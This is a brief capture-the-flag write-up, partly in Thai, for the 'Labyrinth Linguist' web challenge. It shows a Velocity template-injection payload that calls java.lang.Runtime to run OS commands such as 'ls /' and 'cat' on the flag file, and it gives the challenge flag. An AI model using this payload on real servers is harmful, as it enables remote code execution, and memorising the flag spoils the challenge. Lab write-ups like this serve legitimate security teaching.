# Writeup: Labyrinth Linguist (Cyber Apocalypse 2024 - Web)

## 📋 Challenge Summary
- **Event:** Cyber Apocalypse 2024
- **Category:** Web / SSTI (Server-Side Template Injection)
- **Goal:** โจมตีช่องโหว่ Template Injection ใน Java Velocity Engine เพื่ออ่านไฟล์ Flag ในระบบ

## 🔍 Analysis & Solution

เว็บไซต์ให้บริการแปลภาษา โดยรับ Input จากผู้ใช้ไปวางแทนที่คำว่า `TEXT` ในไฟล์ Template HTML:

1. **Technology:** ระบบใช้ภาษา **Java** และใช้ **Velocity Engine** ในการเรนเดอร์ Template
2. **Vulnerability:** เนื่องจากระบบนำ Input จากผู้ใช้ไปใส่ใน Template โดยตรงก่อนเรนเดอร์ ทำให้เราสามารถฉีดคำสั่งของ Velocity (VTL) เข้าไปได้ (**SSTI**)

### 🛠️ Steps to Solve:
1. **RCE Payload:** ใช้ VTL Payload สำหรับ Java เพื่อรันคำสั่ง OS Command ผ่าน `java.lang.Runtime`
   - Payload สำหรับ List ไฟล์: `#set($str="") #set($ex=$str.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ls /")) ...`
2. **Identify Flag:** พบไฟล์ Flag ชื่อแปลกๆ ใน root directory (เช่น `flag6be55db8d2.txt`)
3. **Read Flag:** แก้ไขคำสั่งใน Payload เป็น `cat /flag6be55db8d2.txt` เพื่ออ่านเนื้อหาภายใน

## 🏁 Flag
**HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}**
